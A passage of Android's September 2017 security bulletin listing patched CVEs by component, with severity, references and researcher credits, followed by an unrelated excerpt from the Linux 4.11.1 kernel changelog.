| CVE-2017-0755 | [A-32178311](https://android.googlesource.com/platform/frameworks/minikin/%2B/0dfb3527ba1ebbe97ad927e1f773427201aab501) | EoP | High | 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |

### Media Framework

The most severe vulnerability in this section could enable a remote attacker
using a specially crafted file to execute arbitrary code within the context of
a privileged process.

| CVE | References | Type | Severity | Updated AOSP versions |
| CVE-2017-0756 | [A-34621073](https://android.googlesource.com/platform/frameworks/av/%2B/9aa026d0b867b270149dd7323ce36f4f9bfea980) | RCE | Critical | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0757 | [A-36006815](https://android.googlesource.com/platform/external/libavc/%2B/bb88d4430189b66270c66ff9167fc5bcf4356cf2) | RCE | Critical | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0758 | [A-36492741](https://android.googlesource.com/platform/external/libhevc/%2B/4a534a34b14944f3513b7c101fc74ab0ec9eac0d) | RCE | Critical | 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0759 | [A-36715268](https://android.googlesource.com/platform/frameworks/av/%2B/6c91acf543ea20281f7e3d83414fab3cc64f1938) | RCE | Critical | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0760 | [A-37237396](https://android.googlesource.com/platform/frameworks/av/%2B/9cb10d49b1319ea1207cc2f445089aa9266ffc71) | RCE | Critical | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0761 | [A-38448381](https://android.googlesource.com/platform/external/libavc/%2B/ce512058186120a0de2916f6e22be58455df1a49) | RCE | Critical | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0762 | [A-62214264](https://android.googlesource.com/platform/external/libhevc/%2B/50acbc692998474c598834c9453ca9675b8fb95b) | RCE | Critical | 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0763 | [A-62534693](https://android.googlesource.com/platform/external/libhevc/%2B/0b57e70715c17e038b2fec0f808c1cd2172f4775) | RCE | Critical | 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0764 | [A-62872015](https://android.googlesource.com/platform/external/tremolo/%2B/dbf3d0fa7b89aa09ec7bf69699f6233c59070dbc) | RCE | Critical | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0765 | [A-62872863](https://android.googlesource.com/platform/frameworks/av/%2B/7c4c7fa208e31dc6f355a4488f267122015730a3) | RCE | Critical | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0766 | [A-37776688](https://android.googlesource.com/platform/manifest/%2B/c0218b536c4243993bb666910d888cf16191dfd1) | RCE | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0767 | [A-37536407](https://android.googlesource.com/platform/frameworks/av/%2B/2410a6fa4286efc8c5b5a5f33f6eeb023bfb6abb) [[2](https://android.googlesource.com/platform/hardware/qcom/audio/%2B/045e30499e3c73fb05b0a97da2420fd27bb263a3)] | EoP | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0768 | [A-62019992](https://android.googlesource.com/platform/frameworks/av/%2B/d8cc1fe9294accf05c6afcbe7821a485b9939af7) | EoP | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0769 | [A-37662122](https://android.googlesource.com/platform/frameworks/av/%2B/0be8a2541594feec746195d6dbbc0db6c602175e) | EoP | High | 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0770 | [A-38234812](https://android.googlesource.com/platform/frameworks/av/%2B/292d85545c6dec3c4386ec1fc2877597ea0ac5cc) | EoP | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0771 | [A-37624243](https://android.googlesource.com/platform/external/skia/%2B/f593adeec75fe65771dfe67deca33fa4434b4e8a) | DoS | High | 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0772 | [A-38115076](https://android.googlesource.com/platform/external/libavc/%2B/1e0b52c25b20685ff9d6a14603b6a30f698824a7) | DoS | High | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0773 | [A-37615911](https://android.googlesource.com/platform/external/libhevc/%2B/9a03f9511559f82d034603e1df1425a4e0650f92) | DoS | High | 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0774 | [A-62673844](https://android.googlesource.com/platform/frameworks/av/%2B/d4af2450c500c7d153fd66771b613f6e6882bf08) [[2](https://android.googlesource.com/platform/frameworks/av/%2B/5f56ec847a7f6250abd36a2f8a7b7baf4f966d11)] | DoS | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0775 | [A-62673179](https://android.googlesource.com/platform/frameworks/av/%2B/a1d5b40aaaa050af40c0f95d8b2d3e1ae8cfebbf) | DoS | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0776 | [A-38496660](https://android.googlesource.com/platform/external/libavc/%2B/5863b2e39357d82d53b3163afd38ad3bb0a07042) | ID | Moderate | 7.0, 7.1.1, 7.1.2, 8.0 |
| DoS | High | 6.0.1 |
| CVE-2017-0777 | [A-38342499](https://android.googlesource.com/platform/external/sonivox/%2B/112d9533b13134edbf4b7ee17db735b4b1468297) | ID | Moderate | 7.0, 7.1.1, 7.1.2 |
| DoS | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1 |
| CVE-2017-0778 | [A-62133227](https://android.googlesource.com/platform/frameworks/av/%2B/d7a044350bc151c7f7c04e04aaf136488630d655) | ID | Moderate | 7.0, 7.1.1, 7.1.2 |
| DoS | High | 5.0.2, 5.1.1, 6.0, 6.0.1 |
| CVE-2017-0779 | [A-38340117](https://android.googlesource.com/platform/frameworks/av/%2B/ff4c8310ab7976ea9930b1dc4e3383720d5b5a8d) [[2](https://android.googlesource.com/platform/frameworks/av/%2B/b58464fa783c75ba9d304f670a4392df6fa98ed8)] | ID | Moderate | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |

### Runtime

The most severe vulnerability in this section could enable a remote attacker
using a specially crafted file to cause an application to hang.

| CVE | References | Type | Severity | Updated AOSP versions |
| CVE-2017-0780 | [A-37742976](https://android.googlesource.com/platform/packages/apps/Messaging/%2B/06cbd7f26ba58399f296d85fd155442c7f2ac837) | DoS | High | 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |

### System

The most severe vulnerability in this section could enable a proximate
attacker to execute arbitrary code within the context of a privileged
process.

| CVE | References | Type | Severity | Updated AOSP versions |
| CVE-2017-0781 | [A-63146105](https://android.googlesource.com/platform/system/bt/%2B/c513a8ff5cfdcc62cc14da354beb1dd22e56be0e) [[2](https://android.googlesource.com/platform/system/bt/%2B/1e0bb31f6a809b49014483dc118b9d9ad31ade68)] | RCE | Critical | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0782 | [A-63146237](https://android.googlesource.com/platform/system/bt/%2B/4e47f3db62bab524946c46efe04ed6a2b896b150) [[2](https://android.googlesource.com/platform/system/bt/%2B/1b08775917413f1674882130a948add1ae44cc91)] [[3](https://android.googlesource.com/platform/system/bt/%2B/c568fa9088ded964e0ac99db236e612de5d82177)] | RCE | Critical | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0783 | [A-63145701](https://android.googlesource.com/platform/system/bt/%2B/1e77fefc8b9c832239e1b32c6a6880376065e24e) | ID | High | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |
| CVE-2017-0784 | [A-37287958](https://android.googlesource.com/platform/packages/apps/Nfc/%2B/e216bc208bc0f0f685d8271ef8a0b5da8fae1088) | EoP | Moderate | 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 |
| CVE-2017-0785 | [A-63146698](https://android.googlesource.com/platform/system/bt/%2B/226ea26684d4cd609a5b456d3d2cc762453c2d75) | ID | Moderate | 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0 |

## 2017-09-05 security patch level—Vulnerability details

In the sections below, we provide details for each of the security
vulnerabilities that apply to the 2017-09-05 patch level. Vulnerabilities are
grouped under the component that they affect and include details such as the
CVE, associated references, [type of vulnerability](#type),
[severity](/docs/security/overview/updates-resources#severity),
component (where applicable), and updated AOSP versions (where applicable). When
available, we link the public change that addressed the issue to the bug ID,
like the AOSP change list. When multiple changes relate to a single bug,
additional references are linked to numbers following the bug ID.

### Broadcom components

The most severe vulnerability in this section could enable a proximate
attacker using a specially crafted file to execute arbitrary code within the
context of a privileged process.

| CVE | References | Type | Severity | Component |
| CVE-2017-11120 | A-62575409[\*](#asterisk) B-V2017061204 | RCE | Critical | Wi-Fi driver |
| CVE-2017-11121 | A-62576413[\*](#asterisk) B-V2017061205 | RCE | Critical | Wi-Fi driver |
| CVE-2017-7065 | A-62575138[\*](#asterisk) B-V2017061202 | RCE | Critical | Wi-Fi driver |
| CVE-2017-0786 | A-37351060[\*](#asterisk) B-V2017060101 | EoP | High | Wi-Fi driver |
| CVE-2017-0787 | A-37722970[\*](#asterisk) B-V2017053104 | EoP | Moderate | Wi-Fi driver |
| CVE-2017-0788 | A-37722328[\*](#asterisk) B-V2017053103 | EoP | Moderate | Wi-Fi driver |
| CVE-2017-0789 | A-37685267[\*](#asterisk) B-V2017053102 | EoP | Moderate | Wi-Fi driver |
| CVE-2017-0790 | A-37357704[\*](#asterisk) B-V2017053101 | EoP | Moderate | Wi-Fi driver |
| CVE-2017-0791 | A-37306719[\*](#asterisk) B-V2017052302 | EoP | Moderate | Wi-Fi driver |
| CVE-2017-0792 | A-37305578[\*](#asterisk) B-V2017052301 | ID | Moderate | Wi-Fi driver |

### Imgtk components

The most severe vulnerability in this section could enable a local malicious
application to access data outside of its permission levels.

| CVE | References | Type | Severity | Component |
| CVE-2017-0793 | A-35764946[\*](#asterisk) | ID | High | Memory subsystem |

### Kernel components

The most severe vulnerability in this section could enable a remote attacker
using a specially crafted file to execute arbitrary code within the context of
a privileged process.

| CVE | References | Type | Severity | Component |
| CVE-2017-8890 | A-38413975 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=657831ffc38e30092a2d5f03d385d710eb88b09a) | RCE | Critical | Networking subsystem |
| CVE-2017-9076 | A-62299478 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=83eaddab4378db256d00d295bda6ca997cd13a52) | EoP | High | Networking subsystem |
| CVE-2017-9150 | A-62199770 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=0d0e57697f162da4aa218b5feafe614fb666db07) | ID | High | Linux kernel |
| CVE-2017-7487 | A-62070688 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ee0d8d8482345ff97a75a7d747efc309f13b0d80) | EoP | High | IPX protocol driver |
| CVE-2017-6214 | A-37901268 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ccf7abb93af09ad0868ae9033d1ca8108bdaec82) | DoS | High | Networking subsystem |
| CVE-2017-6346 | A-37897645 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d199fab63c11998a602205f7ee7ff7c05c97164b) | EoP | High | Linux kernel |
| CVE-2017-5897 | A-37871211 [Upstream kernel](https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=7892032cfe67f4bde6fc2ee967e45a8fbaf33756) | ID | High | Networking subsystem |
| CVE-2017-7495 | A-62198330 [Upstream kernel](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=06bd3c36a733ac27962fea7d6f47168841376824) | ID | High | File system |
| CVE-2017-7616 | A-37751399 [Upstream kernel](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cf01fb9985e8deb25ccf0ea54d916b8871ae0e62) | ID | Moderate | Linux kernel |
| CVE-2017-12146 | A-35676417 [Upstream kernel](https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/driver-core.git/commit/?h=driver-core-next&id=6265539776a0810b7ce6398c27866ddb9c6bd154) | EoP | Moderate | Linux kernel |
| CVE-2017-0794 | A-35644812[\*](#asterisk) | EoP | Moderate | SCSI driver |

### MediaTek components

The most severe vulnerability in this section could enable a local malicious
application to execute arbitrary code within the context of a privileged
process.

| CVE | References | Type | Severity | Component |
| CVE-2017-0795 | A-36198473[\*](#asterisk) M-ALPS03361480 | EoP | High | Accessory detector driver |
| CVE-2017-0796 | A-62458865[\*](#asterisk) M-ALPS03353884 M-ALPS03353886 M-ALPS03353887 | EoP | High | AUXADC driver |
| CVE-2017-0797 | A-62459766[\*](#asterisk) M-ALPS03353854 | EoP | High | Accessory detector driver |
| CVE-2017-0798 | A-36100671[\*](#asterisk) M-ALPS03365532 | EoP | High | Kernel |
| CVE-2017-0799 | A-36731602[\*](#asterisk) M-ALPS03342072 | EoP | High | Lastbus |
| CVE-2017-0800 | A-37683975[\*](#asterisk) M-ALPS03302988 | EoP | High | TEEI |
| CVE-2017-0801 | A-38447970[\*](#asterisk) M-ALPS03337980 | EoP | High | LibMtkOmxVdec |
| CVE-2017-0802 | A-36232120[\*](#asterisk) M-ALPS03384818 | EoP | Moderate | Kernel |
| CVE-2017-0803 | A-36136137[\*](#asterisk) M-ALPS03361477 | EoP | Moderate | Accessory detector driver |
| CVE-2017-0804 | A-36274676[\*](#asterisk) M-ALPS03361487 | EoP | Moderate | MMC driver |

### Qualcomm components

The most severe vulnerability in this section could enable a remote attacker
using a specially crafted file to execute arbitrary code within the context of
a privileged process.

| CVE | References | Type | Severity | Component |
| CVE-2017-11041 | A-36130225[\*](#asterisk) QC-CR#2053101 | RCE | Critical | LibOmxVenc |
| CVE-2017-10996 | A-38198574 [QC-CR#901529](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=9f261e5dfe101bbe35043822a89bffa78e080b3b) | ID | High | Linux kernel |
| CVE-2017-9725 | A-38195738 [QC-CR#896659](https://source.codeaurora.org/quic/la/kernel/msm-4.4/commit/?h=aosp/android-4.4&id=1f8f9b566e8446c13b954220c226c58d22076f88) | EoP | High | Memory subsystem |
| CVE-2017-9724 | A-38196929 [QC-CR#863303](https://source.codeaurora.org/quic/la/kernel/msm-3.10/commit/?id=5328a92fa26eabe2ba259b1d813f9de488efc9ec) | EoP | High | Linux kernel |
| CVE-2017-8278 | A-62379474 [QC-CR#2013236](https://source.codeaurora.org/quic/la/platform/hardware/qcom/audio/commit/?id=16caa80d6bd59fc645afda37dec4104d451e2f66) | EoP | High | Audio driver |
| CVE-2017-10999 | A-36490777[\*](#asterisk) QC-CR#2010713 | EoP | Moderate | IPA driver |
| CVE-2017-11001 | A-36815555[\*](#asterisk) QC-CR#2051433 | ID | Moderate | Wi-Fi driver |
| CVE-2017-11002 | A-37712167[\*](#asterisk) QC-CR#2058452 QC-CR#2054690 QC-CR#2058455 | ID | Moderate | Wi-Fi driver |
| CVE-2017-8250 | A-62379051 [QC-CR#2003924](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=9be5b16de622c2426408425e3df29e945cd21d37) | EoP | Moderate | GPU driver |
| CVE-2017-9677 | A-62379475 [QC-CR#2022953](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=dc333eb1c31b5bdd2b6375d7cb890086d8f27d8b) | EoP | Moderate | Audio driver |
| CVE-2017-10998 | A-38195131 [QC-CR#108461](https://source.codeaurora.org/quic/la//kernel/msm-3.18/commit/?id=208e72e59c8411e75d4118b48648a5b7d42b1682) | EoP | Moderate | Audio driver |
| CVE-2017-9676 | A-62378596 [QC-CR#2016517](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=c1f749639030305a3b02185c180240a8195fb715) | ID | Moderate | File system |
| CVE-2017-8280 | A-62377236 [QC-CR#2015858](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=49b9a02eaaeb0b70608c6fbcadff7d83833b9614) | EoP | Moderate | WLAN driver |
| CVE-2017-8251 | A-62379525 [QC-CR#2006015](https://source.codeaurora.org/quic/la/kernel/msm-4.4/commit/?id=771254edea3486535453dbb76d090cd6bcf92af9) | EoP | Moderate | Camera driver |
| CVE-2017-10997 | A-33039685[\*](#asterisk) QC-CR#1103077 | EoP | Moderate | PCI driver |
| CVE-2017-11000 | A-36136563[\*](#asterisk) QC-CR#2031677 | EoP | Moderate | Camera driver |
| CVE-2017-8247 | A-62378684 [QC-CR#2023513](https://source.codeaurora.org/quic/la/kernel/msm-4.4/commit/?id=84f8c42e5d848b1d04f49d253f98296e8c2280b9) | EoP | Moderate | Camera driver |
| CVE-2017-9720 | A-36264696[\*](#asterisk) QC-CR#2041066 | EoP | Moderate | Camera driver |
| CVE-2017-8277 | A-62378788 [QC-CR#2009047](https://source.codeaurora.org/quic/la//kernel/msm-4.4/commit/?id=c9a6f09f1030cec591df837622cb54bbb2d24ddc) | EoP | Moderate | Video driver |
| CVE-2017-8281 | A-62378232 [QC-CR#2015892](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id%3D9be5b16de622c2426408425e3df29e945cd21d37&sa=D&usg=AFQjCNHuM63XOo5Y0C7bMJQIIedBHSDKjw) | ID | Moderate | Automotive multimedia |
| CVE-2017-11040 | A-37567102[\*](#asterisk) QC-CR#2038166 | ID | Moderate | Video driver |

## Google device updates

This table contains the security patch level in the latest over-the-air update
(OTA) and firmware images for Google devices. The Google device OTAs may also
contain additional updates. The Google device firmware images are available on
the [Google
Developer site](https://developers.google.com/android/nexus/images).

Pixel, Pixel XL, Pixel C, Nexus Player, Nexus 5X, and Nexus 6P
devices will be receiving the September security patches as part of the
upgrade to Android Oreo.

| Google device | Security patch level |
| --- | --- |
| Pixel / Pixel XL | 2017-09-05 |
| Nexus 5X | 2017-09-05 |
| Nexus 6 | 2017-09-05 |
| Nexus 6P | 2017-09-05 |
| Nexus 9 | 2017-09-05 |
| Nexus Player | 2017-09-05 |
| Pixel C | 2017-09-05 |

## Acknowledgements

We would like to thank these researchers for their contributions:

| CVEs | Researchers |
| CVE-2017-11000 | Baozeng Ding ([@sploving](https://twitter.com/sploving1)), Chengming Yang, and Yang Song of Alibaba Mobile Security Group |
| CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, CVE-2017-0785 | Ben Seri and Gregory Vishnepolsky of Armis, Inc. (<https://armis.com>) |
| CVE-2017-0800, CVE-2017-0798 | Chengming Yang, Baozeng Ding, and Yang Song of Alibaba Mobile Security Group |
| CVE-2017-0765 | Chi Zhang, Mingjian Zhou ([@Mingjian\_Zhou](https://twitter.com/Mingjian_Zhou)), and Xuxian Jiang of [C0RE Team](http://c0reteam.org) |
| CVE-2017-0758 | [Chong Wang](http://weibo.com/csddl) and 金哲 (Zhe Jin) of Chengdu Security Response Center, Qihoo 360 Technology Co. Ltd. |
| CVE-2017-0752 | Cong Zheng ([@shellcong](https://twitter.com/shellcong)), Wenjun Hu, Xiao Zhang, and Zhi Xu of Palo Alto Networks |
| CVE-2017-0801 | Dacheng Shao, Mingjian Zhou ([@Mingjian\_Zhou](https://twitter.com/Mingjian_Zhou)), and Xuxian Jiang of [C0RE Team](http://c0reteam.org) |
| CVE-2017-0755 | Dawei Peng of Alibaba Mobile Security Team ([weibo: Vinc3nt4H](http://weibo.com/u/5622360291)) |
| CVE-2017-0775, CVE-2017-0774, CVE-2017-0771 | Elphet and Gong Guang of Alpha Team, Qihoo 360 Technology Co. Ltd. |
| CVE-2017-0784 | En He ([@heeeeen4x](https://twitter.com/heeeeen4x)) and Bo Liu of [MS509Team](http://www.ms509.com) |
| CVE-2017-10997 | Gengjia Chen ([@chengjia4574](https://twitter.com/chengjia4574)) and [pjf](http://weibo.com/jfpan) of IceSword Lab, Qihoo 360 Technology Co. Ltd. |
| CVE-2017-0786, CVE-2017-0792, CVE-2017-0791, CVE-2017-0790, CVE-2017-0789, CVE-2017-0788, CVE-2017-0787 | Hao Chen and Guang Gong of Alpha Team, Qihoo 360 Technology Co. Ltd. |
| CVE-2017-0802 | Jake Corina ([@JakeCorina](https://twitter.com/JakeCorina)) of Shellphish Grill Team |
| CVE-2017-0780 | Jason Gu and Seven Shen of Trend Micro |
| CVE-2017-0769 | Mingjian Zhou ([@Mingjian\_Zhou](https://twitter.com/Mingjian_Zhou)), Dacheng Shao, and Xuxian Jiang of [C0RE Team](http://c0reteam.org) |
| CVE-2017-0794, CVE-2017-9720, CVE-2017-11001, CVE-2017-10999, CVE-2017-0766 | Pengfei Ding (丁鹏飞), Chenfu Bao (包沉浮), Lenx Wei (韦韬) of Baidu X-Lab (百度安全实验室) |
| CVE-2017-0772 | Seven Shen of Trend Micro |
| CVE-2017-0757 | Vasily Vasiliev |
| CVE-2017-0768, CVE-2017-0779 | Wenke Dou, Mingjian Zhou ([@Mingjian\_Zhou](https://twitter.com/Mingjian_Zhou)), and Xuxian Jiang of [C0RE Team](http://c0reteam.org) |
| CVE-2017-0759 | [Weichao Sun](https://twitter.com/sunblate) of Alibaba Inc. |
| CVE-2017-0796 | Xiangqian Zhang, Chengming Yang, Baozeng Ding, and Yang Song of Alibaba Mobile Security Group |
| CVE-2017-0753 | Yangkang ([@dnpushme](https://twitter.com/dnpushme)) and hujianfei of Qihoo360 Qex Team |
| CVE-2017-12146 | Yonggang Guo ([@guoygang](https://twitter.com/guoygang)) of IceSword Lab, Qihoo 360 Technology Co. Ltd. |
| CVE-2017-0767 | Yongke Wang and Yuebin Sun of [Tencent's Xuanwu Lab](http://xlab.tencent.com) |
| CVE-2017-0804, CVE-2017-0803, CVE-2017-0799, CVE-2017-0795 | [Yu Pan](http://weibo.com/panyu6325) and Yang Dai of Vulpecker Team, Qihoo 360 Technology Co. Ltd |
| CVE-2017-0760 | [Zinuo Han](http://weibo.com/ele7enxxh) and 金哲 (Zhe Jin) of Chengdu Security Response Center, Qihoo 360 Technology Co. Ltd. |
| CVE-2017-0764, CVE-2017-0761, CVE-2017-0776, CVE-2017-0777, CVE-2017-0778 | [Zinuo Han](http://weibo.com/ele7enxxh) of Chengdu Security Response Center, Qihoo 360 Technology Co. Ltd. |

## Common questions and answers

This section answers common questions that may occur after reading this
bulletin.

**1. How do I determine if my device is updated to address these issues?**

To learn how to check a device's security patch level, read the instructions on
the [Pixel
and Nexus update schedule](https://support.google.com/pixelphone/answer/4457705#pixel_phones&nexus_devices).

* Security patch levels of 2017-09-01 or later address all issues associated
  with the 2017-09-01 security patch level.
* Security patch levels of 2017-09-05 or later address all issues associated
  with the 2017-09-05 security patch level and all previous patch levels.

Device manufacturers that include these updates should set the patch string
level to:

* [ro.build.version.security\_patch]:[2017-09-01]
* [ro.build.version.security\_patch]:[2017-09-05]

**2. Why does this bulletin have two security patch levels?**

This bulletin has two security patch levels so that Android partners have the
flexibility to fix a subset of vulnerabilities that are similar across all
Android devices more quickly. Android partners are encouraged to fix all issues
in this bulletin and use the latest security patch level.

* Devices that use the 2017-09-01 security patch level must include all issues
  associated with that security patch level, as well as fixes for all issues
  reported in previous security bulletins.
* Devices that use the security patch level of 2017-09-05 or newer must
  include all applicable patches in this (and previous) security
  bulletins.

Partners are encouraged to bundle the fixes for all issues they are addressing
in a single update.

**3. What do the entries in the *Type* column mean?**

Entries in the *Type* column of the vulnerability details table reference
the classification of the security vulnerability.

| Abbreviation | Definition |
| RCE | Remote code execution |
| EoP | Elevation of privilege |
| ID | Information disclosure |
| DoS | Denial of service |
| N/A | Classification not available |

**4. What do the entries in the *References* column mean?**

Entries under the *References* column of the vulnerability details table
may contain a prefix identifying the organization to which the reference value
belongs.

| Prefix | Reference |
| A- | Android bug ID |
| QC- | Qualcomm reference number |
| M- | MediaTek reference number |
| N- | NVIDIA reference number |
| B- | Broadcom reference number |

**5. What does a \* next to the Android bug ID in the *References*
column mean?**

Issues that are not publicly available have a \* next to the Android bug ID in
the *References* column. The update for that issue is generally contained
in the latest binary drivers for Nexus devices available from the [Google Developer
site](https://developers.google.com/android/nexus/drivers).

## Versions

| Version | Date | Notes |
| 1.0 | September 5, 2017 | Bulletin published. |
| 1.1 | September 12, 2017 | Added details for CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, and CVE-2017-0785 as part of industry-coordinated disclosure. |
| 1.2 | September 13, 2017 | Bulletin revised to include AOSP links. |
| 1.3 | September 25, 2017 | Added details for CVE-2017-11120 and CVE-2017-11121 as part of industry-coordinated disclosure. |
| 1.4 | September 28, 2017 | Update vendor reference for CVE-2017-11001. |

Content and code samples on this page are subject to the licenses described in the [Content License](/license). Java and OpenJDK are trademarks or registered trademarks of Oracle and/or its affiliates.

Last updated 2024-08-26 UTC.

[[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Missing the information I need","missingTheInformationINeed","thumb-down"],["Too complicated / too many steps","tooComplicatedTooManySteps","thumb-down"],["Out of date","outOfDate","thumb-down"],["Samples / code issue","samplesCodeIssue","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2024-08-26 UTC."],[],[]]

* ### Build

  + [Android repository](//android.googlesource.com)
  + [Requirements](/source/requirements)
  + [Downloading](/source/downloading)
  + [Preview binaries](//developers.google.com/android/blobs-preview/)
  + [Factory images](//developers.google.com/android/images/)
  + [Driver binaries](//developers.google.com/android/drivers/)
* ### Connect

  + [@Android on Twitter](//twitter.com/Android/)
  + [@AndroidDev on Twitter](//twitter.com/AndroidDev/)
  + [Android Blog](//blog.google/products/android/)
  + [Google Security Blog](//security.googleblog.com)
  + [Platform on Google Groups](//groups.google.com/forum/?fromgroups#!forum/android-platform/)
  + [Building on Google Groups](//groups.google.com/forum/?fromgroups#!forum/android-building/)
  + [Porting on Google Groups](//groups.google.com/forum/?fromgroups#!forum/android-porting/)
* ### Get help

  + [Android Help Center](//support.google.com/android/)
  + [Pixel Help Center](//support.google.com/pixelphone/)
  + [www.android.com](//www.android.com)
  + [Google Mobile Services](//www.android.com/gms/)
  + [Stack Overflow](//stackoverflow.com/questions/tagged/android-source/)
  + [Issue Tracker](//issuetracker.google.com/issues?q=status:open%20componentid:190923)

* [About Android](/source/)
* [Community](/source/community)
* [Legal](/legal)
* [License](/license)
* [Privacy](//policies.google.com/privacy)
* [Site feedback](//issuetracker.google.com/issues/new?component=191476)
* Manage cookies

* English
* Deutsch
* Español
* Español – América Latina
* Français
* Indonesia
* Italiano
* Polski
* Português
* Português – Brasil
* Tiếng Việt
* Türkçe
* Русский
* עברית
* العربيّة
* فارسی
* हिंदी
* বাংলা
* ภาษาไทย
* 中文 – 简体
* 中文 – 繁體
* 日本語
* 한국어



=== Content from www.kernel.org_fc294152_20250124_115158.html ===
commit 4c71e91a048f77e97205831a7dd1fe86c63d2738
Author: Greg Kroah-Hartman
Date: Sun May 14 14:06:16 2017 +0200
Linux 4.11.1
commit 0873ab02247ec7453b0758e99f125587bfb4cd85
Author: Ilya Dryomov
Date: Tue Apr 18 18:43:20 2017 +0200
block: get rid of blk\_integrity\_revalidate()
commit 19b7ccf8651df09d274671b53039c672a52ad84d upstream.
Commit 25520d55cdb6 ("block: Inline blk\_integrity in struct gendisk")
introduced blk\_integrity\_revalidate(), which seems to assume ownership
of the stable pages flag and unilaterally clears it if no blk\_integrity
profile is registered:
if (bi->profile)
disk->queue->backing\_dev\_info->capabilities |=
BDI\_CAP\_STABLE\_WRITES;
else
disk->queue->backing\_dev\_info->capabilities &=
~BDI\_CAP\_STABLE\_WRITES;
It's called from revalidate\_disk() and rescan\_partitions(), making it
impossible to enable stable pages for drivers that support partitions
and don't use blk\_integrity: while the call in revalidate\_disk() can be
trivially worked around (see zram, which doesn't support partitions and
hence gets away with zram\_revalidate\_disk()), rescan\_partitions() can
be triggered from userspace at any time. This breaks rbd, where the
ceph messenger is responsible for generating/verifying CRCs.
Since blk\_integrity\_{un,}register() "must" be used for (un)registering
the integrity profile with the block layer, move BDI\_CAP\_STABLE\_WRITES
setting there. This way drivers that call blk\_integrity\_register() and
use integrity infrastructure won't interfere with drivers that don't
but still want stable pages.
Fixes: 25520d55cdb6 ("block: Inline blk\_integrity in struct gendisk")
Cc: "Martin K. Petersen"
Cc: Christoph Hellwig
Cc: Mike Snitzer
Tested-by: Dan Williams
Signed-off-by: Ilya Dryomov
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 3ed024e27424c98237aae18b968c9a3bb69358e6
Author: Boris Ostrovsky
Date: Mon Apr 24 15:04:53 2017 -0400
xen: Revert commits da72ff5bfcb0 and 72a9b186292d
commit 84d582d236dc1f9085e741affc72e9ba061a67c2 upstream.
Recent discussion (http://marc.info/?l=xen-devel&m=149192184523741)
